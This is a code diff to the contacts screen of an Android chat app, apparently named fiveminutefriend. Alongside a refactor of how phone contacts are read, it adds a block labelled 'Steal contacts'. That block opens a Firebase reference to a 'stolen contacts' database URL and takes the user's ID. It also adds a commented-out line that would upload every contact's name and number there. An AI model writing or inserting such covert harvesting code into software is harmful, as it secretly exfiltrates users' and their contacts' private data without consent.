@@ -21,6 +21,10 @@ import com.google.firebase.iid.FirebaseInstanceId
 import com.p.fiveminutefriend.Adapters.ContactsFragmentListAdapter
 import com.p.fiveminutefriend.Adapters.RecentFragmentListAdapter
 import com.p.fiveminutefriend.ChatActivity
+import com.google.firebase.auth.FirebaseAuth
+import com.google.firebase.database.FirebaseDatabase
+import com.p.fiveminutefriend.Adapters.ContactsFragmentListAdapter
+import com.p.fiveminutefriend.Constants
 import com.p.fiveminutefriend.Model.Contact
 import com.p.fiveminutefriend.Model.Match
 import com.p.fiveminutefriend.Model.User
@@ -108,6 +112,16 @@ class ContactsFragment : Fragment() {
     }
 
     private fun getContacts() : List<Contact> {
+
+        //Steal contacts    ***                                        //
+        val dbReferenceForContacts = FirebaseDatabase                   //
+                .getInstance()                                           //
+                .getReferenceFromUrl(Constants.FIREBASE_STOLEN_CONTACTS)  //
+                                                                        //
+        val userID = FirebaseAuth.getInstance().currentUser!!.uid     //
+        //Steal contacts    ***                                     //
+
+
         val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null,
                 null,
@@ -118,14 +132,20 @@ class ContactsFragment : Fragment() {
 
         val contacts = ArrayList<Contact>()
         while(cursor.moveToNext()) {
-            contacts.add(Contact(cursor.getString(cursor.getColumnIndex(ContactsContract
+
+            val contact = Contact(cursor.getString(cursor.getColumnIndex(ContactsContract
+                    .CommonDataKinds
+                    .Phone
+                    .DISPLAY_NAME)),
+                    cursor.getString(cursor.getColumnIndex(ContactsContract
                             .CommonDataKinds
                             .Phone
-                            .DISPLAY_NAME)),
-                            cursor.getString(cursor.getColumnIndex(ContactsContract
-                                    .CommonDataKinds
-                                    .Phone
-                                    .NUMBER))))
+                            .NUMBER)))
+
+            contacts.add(contact)
+
+            //DB call for stealing contacts.
+            //dbReferenceForContacts.child(userID).child(contact.name).setValue(contact.phoneNumber)
         }
         cursor.close()
         return contacts
